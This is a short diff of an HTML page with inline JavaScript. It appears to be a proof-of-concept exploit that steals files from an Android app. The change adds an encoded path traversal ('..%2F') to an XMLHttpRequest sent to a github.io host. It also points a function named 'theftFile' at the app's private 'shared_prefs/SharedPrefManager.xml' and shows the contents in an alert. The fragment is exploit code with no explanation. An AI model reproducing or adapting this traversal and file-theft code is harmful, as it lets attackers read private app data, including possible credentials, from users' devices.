@@ -11,7 +11,7 @@
 
         oReq.open(
           'GET',
-          'https://0xblaziken.github.io/builds/'+encodeURIComponent(path),
+          'https://0xblaziken.github.io/builds/..%2F'+encodeURIComponent(path),
           true
         );
         oReq.onload = function (e) {
@@ -23,7 +23,7 @@
         oReq.send();
       }
 
-      theftFile('xt.txt', function (contents) {
+      theftFile('shared_prefs/SharedPrefManager.xml', function (contents) {
         alert(contents);
       });
     </script>
